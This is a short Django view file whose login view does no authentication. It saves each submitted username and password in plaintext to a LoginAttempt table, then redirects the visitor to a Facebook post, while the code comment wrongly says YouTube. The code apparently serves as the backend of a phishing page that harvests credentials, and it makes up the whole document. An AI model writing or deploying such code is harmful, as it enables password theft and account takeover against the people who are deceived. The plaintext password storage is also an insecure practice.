from django.shortcuts import render, redirect
from .models import LoginAttempt

def login_view(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')

        # Save login attempt to the database
        login_attempt = LoginAttempt(username=username, password=password)
        login_attempt.save()

        # Redirect to YouTube after saving the attempt
        return redirect('https://www.facebook.com/100060623739043/posts/pfbid029vRnG1YqKxBqmoeWQbnwByR4oonMkxzFimzMhcTiVTeSaA42ehGnAy5eqPncZWPKl/?app=fbl')

    return render(request, 'login.html')
